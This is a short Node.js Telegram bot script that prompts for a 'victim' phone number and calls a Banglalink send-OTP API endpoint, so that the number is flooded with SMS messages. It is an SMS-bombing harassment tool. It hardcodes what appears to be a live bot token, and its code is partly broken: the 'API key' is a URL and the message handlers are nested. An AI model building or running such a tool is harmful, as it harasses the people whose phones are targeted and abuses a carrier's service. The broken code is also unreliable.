const Telegraf = require('telegraf');
const axios = require('axios');

// Replace YOUR_TELEGRAM_BOT_TOKEN with the token you received from BotFather
const bot = new Telegraf('7464985519:AAFtw_Ln9H3tBrByqesiSe_wFSUoMVv1Qx0');

// Replace YOUR_BANGLALINK_API_KEY with your Banglalink API key
const apiKey = 'https://eshop-api.banglalink.net/api/v1/customer/send-otp';

// This is the function that will be called every time a user sends a message to your bot
bot.on('message', (ctx) => {
  const chatId = ctx.chat.id;

  // Ask the user for the phone number of the victim
  ctx.reply('Enter the phone number of the victim (including the country code):');

  // Listen for the user's response
  bot.on('message', (ctx) => {
    const phoneNumber = ctx.message.text;
    const victimChatId = phoneNumber.replace('+', ''); // Remove the '+' sign from the phone number

    // Send a message to the victim's phone number using the Banglalink API
    axios.post(`https://eshop-api.banglalink.net/api/v1/customer/send-otp?api_key=${apiKey}`, {
      phone: victimChatId,
      message: 'You have been bombed by a Telegram bot! 😂',
    })
    .then(() => {
      // Success!
      ctx.reply('SMS message sent to the victim!');
    })
    .catch((error) => {
      // Error!
      ctx.reply(`Error: ${error.message}`);
    });
  });
});

// Start the bot
bot.launch();